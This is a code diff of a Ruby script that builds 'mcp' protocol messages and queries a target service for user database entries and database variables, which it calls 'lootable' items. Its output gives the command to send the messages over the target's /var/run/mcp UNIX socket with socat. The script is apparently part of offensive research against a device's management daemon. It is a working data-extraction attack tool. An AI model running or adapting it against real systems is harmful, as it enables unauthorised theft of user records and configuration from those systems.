@@ -1,17 +1,20 @@
 require './mcp-builder.rb'
 
-$stderr.puts("Writing an `mcp` message to stdout that'll query for interesting stuff")
+if ARGV.length > 0
+  LOOTABLE = ARGV
+  $stderr.puts("Writing an `mcp` message to stdout that'll query for your requests: #{ LOOTABLE.join(', ') }")
+else
+  LOOTABLE = ['userdb_entry', 'db_variable']
+  $stderr.puts("Writing an `mcp` message to stdout that'll query for interesting stuff: #{ LOOTABLE.join(', ') }")
+end
+
 $stderr.puts("Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin")
 $stderr.puts
 
-print build_packet(
-  build('query_all', 'structure', [
-    build('userdb_entry', 'structure', [])
-  ])
-)
-
-print build_packet(
-  build('query_all', 'structure', [
-    build('db_variable', 'structure', [])
-  ])
-)
+LOOTABLE.each do |l|
+  print build_packet(
+    build('query_all', 'structure', [
+      build(l, 'structure', [])
+    ])
+  )
+end
